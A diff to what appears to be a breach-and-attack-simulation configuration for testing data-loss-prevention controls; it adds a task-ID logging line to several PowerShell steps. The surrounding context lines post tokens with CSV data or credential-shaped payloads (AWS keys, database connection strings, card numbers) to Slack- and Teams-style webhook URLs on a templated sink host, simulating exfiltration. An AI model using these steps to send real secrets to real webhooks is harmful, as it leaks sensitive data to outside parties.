@@ -69,6 +69,7 @@ steps:
       $body = @{ text = "$token`n$csvContent" } | ConvertTo-Json -Compress
       $uri = "https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/slack/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10 | Out-Null
         Write-Output "DLP_OBSERVATION: slack_webhook_result=success"
         Write-Output "EXEC T1567.004: Slack-compatible webhook traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-WEBHOOK-SLACK]"
@@ -111,6 +112,7 @@ steps:
       $body = @{ text = "$token`n$csvContent" } | ConvertTo-Json -Compress
       $uri = "https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/teams/webhookb2/00000000-0000-0000-0000-000000000000/IncomingWebhook/11111111111111111111111111111111/22222222-2222-2222-2222-222222222222"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10 | Out-Null
         Write-Output "DLP_OBSERVATION: teams_webhook_result=success"
         Write-Output "EXEC T1567.004: Microsoft Teams-compatible webhook traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-WEBHOOK-TEAMS]"
@@ -149,6 +151,7 @@ steps:
       $body = @{ text = "$token`n$payload" } | ConvertTo-Json -Compress
       $uri = "https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/slack/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10 | Out-Null
         Write-Output "DLP_OBSERVATION: slack_webhook_result=success"
         Write-Output "EXEC T1567.004: AWS-credential-shaped Slack webhook traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-WEBHOOK-SLACK]"
@@ -187,6 +190,7 @@ steps:
       $body = @{ text = "$token`n$payload" } | ConvertTo-Json -Compress
       $uri = "https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/slack/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10 | Out-Null
         Write-Output "DLP_OBSERVATION: slack_webhook_result=success"
         Write-Output "EXEC T1567.004: PostgreSQL-connection-string-shaped Slack webhook traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-WEBHOOK-SLACK]"
@@ -225,6 +229,7 @@ steps:
       $body = @{ text = "$token`n$payload" } | ConvertTo-Json -Compress
       $uri = "https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/teams/webhookb2/00000000-0000-0000-0000-000000000000/IncomingWebhook/11111111111111111111111111111111/22222222-2222-2222-2222-222222222222"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10 | Out-Null
         Write-Output "DLP_OBSERVATION: teams_webhook_result=success"
         Write-Output "EXEC T1567.004: Maestro-card-shaped Teams webhook traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-WEBHOOK-TEAMS]"
